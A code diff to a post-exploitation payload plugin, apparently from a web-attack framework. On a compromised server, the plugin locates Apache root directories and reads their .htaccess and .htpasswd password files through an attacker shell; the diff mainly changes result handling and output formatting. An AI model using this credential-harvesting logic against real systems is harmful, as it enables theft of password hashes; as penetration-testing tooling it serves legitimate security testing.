@@ -1,7 +1,7 @@
 import re
 from plugins.attack.payloads.base_payload import base_payload
+from core.ui.consoleUi.tables import table
 
-#TODO: Perform more testing
 
 class apache_htaccess(base_payload):
     '''
@@ -29,31 +29,31 @@ class apache_htaccess(base_payload):
                         htaccess = parse_htaccess(line)
 
         
-        apache_root = self.exec_payload('apache_root_directory')
+        apache_root = self.exec_payload('apache_root_directory')['apache_root_directory']
         if apache_root:
             for dir in apache_root:
                 htaccess_content = self.shell.read(dir+htaccess)
                 if htaccess_content:
-                    result['htaccess_files'] .update({dir+htaccess:htaccess_content})
+                    result['htaccess_files'][ dir+htaccess ] = htaccess_content
                 
                 htpasswd_content = self.shell.read(dir+'.htpasswd')
                 if htpasswd_content:
-                    result['htaccess_files'] .update({dir+'.htpasswd':htpasswd_content})
+                    result['htaccess_files'][ dir+'.htpasswd' ] = htpasswd_content
         
         return result
     
     def run_read(self):
-        hashmap = self.api_read()
-        result = []
-        
-        if hashmap:
-            result.append('Apache Htaccess Files')
-            for file, content in hashmap['htaccess_files'].iteritems():
-                result.append('-------------------------')
-                result.append(file)
-                result.append('-------------------------')
-                result.append(content)
-        
-        if result == [ ]:
-            result.append('Htaccess files not found.')
-        return result
+        api_result = self.api_read()
+
+        if not api_result['htaccess_files']:
+            return 'Apache htaccess files not found.'
+        else:
+            rows = []
+            rows.append( ['Apache htaccess files'] ) 
+            rows.append( [] )
+            for key_name in api_result:
+                for filename, file_content in api_result[key_name].items():
+                    rows.append( [filename,] )
+            result_table = table( rows )
+            result_table.draw( 80 )                    
+            return
